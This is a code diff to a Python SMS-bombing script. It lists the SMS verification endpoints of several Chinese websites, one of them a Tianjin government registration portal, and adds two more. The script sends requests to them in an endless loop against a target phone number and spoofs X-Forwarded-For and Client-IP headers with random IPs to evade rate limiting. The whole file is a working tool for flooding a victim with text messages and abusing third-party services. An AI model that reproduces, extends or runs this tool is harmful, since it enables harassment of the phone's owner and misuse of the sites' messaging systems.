@@ -15,10 +15,19 @@ phone = ""
 # 短信接口API 请求间隔时间 备注 请求方式 请求参数 需要SESSION的先决请求URL以及Referer
 APIList = [
 ["https://login.ceconline.com/thirdPartLogin.do",60,"世界经理人","POST",{"mobileNumber":phone,"method": "getDynamicCode","verifyType": "MOBILE_NUM_REG","captcharType":"","time": str(int(time.time()*1000))},""],
+
 ["http://www.ntjxj.com/InternetWeb/SendYzmServlet",120,"机动车手机绑定","POST",{"sjhm" : phone},"http://www.ntjxj.com/InternetWeb/regHphmToTel.jsp"],
+
 ["https://www.itjuzi.com/api/verificationCodes",60,"IT橘子","POST",{"account": phone},""],
+
 ["http://yifatong.com/Customers/gettcode",60,"易法通","GET",{"rnd": ("%0.3f" % (time.time())),"mobile":phone},"http://yifatong.com/Customers/registration?url="],
-["http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",60,"天津企业登记","POST",{'MOBILENO': phone,'TEMP': 1},""]
+
+["http://qydj.scjg.tj.gov.cn/reportOnlineService/login_login",60,"天津企业登记","POST",{'MOBILENO': phone,'TEMP': 1},""],
+
+["http://www.shijiebang.com/a/mobile/vcode/",120,"世界邦","GET",{'key': phone},"http://www.shijiebang.com/reg/"],
+
+["http://reg.ztgame.com/common/sendmpcode?source=giant_site&nonce=&type=verifycode&token=&refurl=&cururl=http://reg.ztgame.com/&mpcode=&pwd=&tname=&idcard=",60,"巨人网络","GET",{'phone': phone},"http://reg.ztgame.com/"]
+
 ]
 ########################################
 
@@ -26,60 +35,52 @@ class initSMS(object):
     """docstring for initSMS"""
     def __init__(self):
         super(initSMS, self).__init__()
-
-    SMSList = []
-
+        self.SMSList = []
+        self.intervalInfo = 0
+    
     def initBomb(self):
         for x in APIList:
-            self.SMSList.append(SMSObject(x[0],x[1],x[2],x[3],x[4],x[5]))
+            self.SMSList.append(SMSObject(x[0],x[1],x[2],x[3],x[4],x[5],self.intervalInfo))
+            self.intervalInfo += 1
         return self.SMSList
 
 
 
 class SMSObject(object):
-    """docstring for SMSObject"""
-    def __init__(self, url, interval, info, method, params, others):
+    """docstring for SMSObject""" # __var 私有成员变量
+    def __init__(self, url, interval, info, method, params, others, intervalInfo):
         super(SMSObject, self).__init__()
-        self.url = url
-        self.interval = interval
-        self.info = info
-        self.intervalInfo = 0
-        self.method = method
-        self.params = params
-        self.others = others
-
-
-    url = ""
-    interval = 30
-    info = ""
-    intervalInfo = 0
-    method = "GET"
-    params = {}
-    others = ""
+        self.__url = url
+        self.__interval = interval
+        self.__info = info
+        self.__intervalInfo = intervalInfo
+        self.__method = method
+        self.__params = params
+        self.__others = others
 
     def getUrl(self):
-        return self.url
+        return self.__url
 
     def getInfo(self):
-        return self.info
+        return self.__info
 
     def getParams(self):
-        return self.params
+        return self.__params
 
     def getMethod(self):
-        return self.method
+        return self.__method
 
     def getOthers(self):
-        return self.others
+        return self.__others
 
     def getInterval(self):
-        return self.interval
+        return self.__interval
 
     def getintervalInfo(self):
-        return self.intervalInfo
+        return self.__intervalInfo
 
     def setintervalInfo(self, intervalInfo):
-        self.intervalInfo = intervalInfo
+        self.__intervalInfo = intervalInfo
     
 
 
@@ -87,17 +88,17 @@ class Bomb(object):
     """docstring for Bomb"""
     def __init__(self):
         super(Bomb, self).__init__()
-    
-    HEADERS = {
-    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
-    'Referer': 'http://10.13.0.1',
-    'accept-encoding': 'gzip, deflate, br',
-    'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
-    'cache-control': 'max-age=0',
-    "X-Requested-With":"XMLHttpRequest"
-    }
+        self.HEADERS = {
+        'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.81 Safari/537.36',
+        'Referer': 'http://10.13.0.1',
+        'accept-encoding': 'gzip, deflate, br',
+        'accept-language': 'zh-CN,zh-TW;q=0.8,zh;q=0.6,en;q=0.4,ja;q=0.2',
+        'cache-control': 'max-age=0',
+        "X-Requested-With":"XMLHttpRequest"
+        }
 
     def send(self,SMS):
+        # return "SUCCESS"
         IP = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
         self.HEADERS['X-FORWARDED-FOR'] = IP
         self.HEADERS['CLIENT-IP'] = IP
@@ -120,7 +121,10 @@ if __name__ == '__main__':
     SMSList = initSMS().initBomb()
     switchOn = Bomb()
     i = 0
+    currTime = 0
     while True:
+        currTime+=1
+        # print(currTime)
         for x in SMSList:
             if x.getintervalInfo() == 0:
                 i+=1
